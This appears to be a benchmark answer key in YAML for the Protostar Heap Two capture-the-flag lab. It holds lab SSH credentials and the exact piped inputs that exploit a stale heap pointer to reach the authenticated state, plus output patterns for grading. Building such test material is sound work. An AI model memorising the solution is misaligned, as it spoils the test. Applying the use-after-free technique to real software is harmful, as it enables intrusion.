@@ -1,0 +1,92 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: protostar_heap2
+  name: Protostar Heap Two
+  description: Exploit the stale heap pointer logic so that auth->auth becomes non-zero before login.
+attacker_context:
+  user: user
+  access:
+    method: ssh
+    credentials:
+      username: user
+      password: user
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node3
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- strings
+- checksec
+- file
+- ls
+- ls -la
+- env
+- printenv
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Auth allocation primitive used
+- id: node1
+  type: state
+  label: Freed auth chunk replaced by service allocation
+- id: node2
+  type: state
+  label: login checks attacker-controlled auth field
+- id: node3
+  type: state
+  label: Authenticated path reached
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: allocate_auth_structure
+  accepted_commands:
+  - echo 'auth A' | /opt/protostar/bin/heap2
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*auth = .*
+    stderr_regex: ^$
+- id: edge1
+  from: node0
+  to: node1
+  action: free_auth_and_replace_with_service_data
+  accepted_commands:
+  - (echo 'auth A'; echo 'reset'; echo 'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA') | /opt/protostar/bin/heap2
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*service = .*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: trigger_login_on_stale_pointer
+  accepted_commands:
+  - (echo 'auth A'; echo 'reset'; echo 'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; echo 'login') | /opt/protostar/bin/heap2
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*(logged in already|please enter your password).*
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: obtain_already_logged_in_message
+  accepted_commands:
+  - (echo 'auth A'; echo 'reset'; echo 'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; echo 'login') | /opt/protostar/bin/heap2
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*you have logged in already!.*
+    stderr_regex: ^$
